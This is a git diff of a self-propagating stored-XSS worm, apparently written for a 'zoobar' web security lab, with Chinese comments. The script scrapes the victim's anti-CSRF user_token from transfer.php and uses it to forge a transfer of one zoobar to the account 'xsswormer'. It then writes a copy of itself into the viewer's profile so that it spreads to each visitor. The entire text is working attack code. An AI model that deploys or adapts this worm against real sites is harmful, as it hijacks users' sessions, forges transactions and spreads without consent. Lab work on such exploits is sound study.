@@ -1,22 +1,36 @@
 <!--xss 蠕虫，将其存入user profile中生效-->
 <span id="xssworm-span">
     <script>
-        xmlhttp=new XMLHttpRequest();
-        xmlhttp.open("POST","https://niss.com/transfer.php",false);
-        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        // 获取 transfer.php 表单中的token
+        const transferReq = new XMLHttpRequest();
+        transferReq.open("POST","https://niss.com/transfer.php",false)
+        // transferReq.withCredentials = true;
+        transferReq.setRequestHeader("Referer","https://niss.com/transfer.php")
+        transferReq.send();
+        let context = transferReq.responseText;
+        alert(context.substr(context.indexOf("user_token") + 19, 32))
+        let token = context.substr(context.indexOf("user_token") + 19, 32);
+
         // 提交请求，为 xsswormer 转一个zoobar
-        xmlhttp.send("zoobars=1&recipient=xsswormer&submission=Send");
+        transferReq.open("POST", "https://niss.com/transfer.php", false);
+        // transferReq.withCredentials = true;
+        transferReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        // transferReq.setRequestHeader("Referer","https://niss.com/tranfer.php")
+        let data = "zoobars=1&recipient=xsswormer&submission=Send&user_token="+token;
+        transferReq.send(data);
+        alert("transfer req send")
 
         // 提交profile更新请求
-        xmlhttp=new XMLHttpRequest();
-        xmlhttp.open("POST","https://niss.com/index.php",true);
-        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        transferReq.open("POST", "https://niss.com/index.php", false);
+        transferReq.setRequestHeader("Referer","https://niss.com/tranfer.php")
+        transferReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         // 读取本文件 ==> str
-        str = "<span id=xssworm-span>"
-        str += document.getElementById("xssworm-span").innerHTML + "</span>";
-        str = encodeURIComponent(str);
+        porfileData = "<span id=xssworm-span>"
+        porfileData += document.getElementById("xssworm-span").innerHTML + "</span>";
+        porfileData = encodeURIComponent(porfileData);
         // 将其保存至 profile中
-        str = "profile_submit=Save&profile_update=" + str;
-        xmlhttp.send(str);
+        porfileData = "profile_submit=Save&profile_update=" + porfileData;
+        transferReq.send(porfileData);
+        alert("profile update req send")
     </script>
 </span>
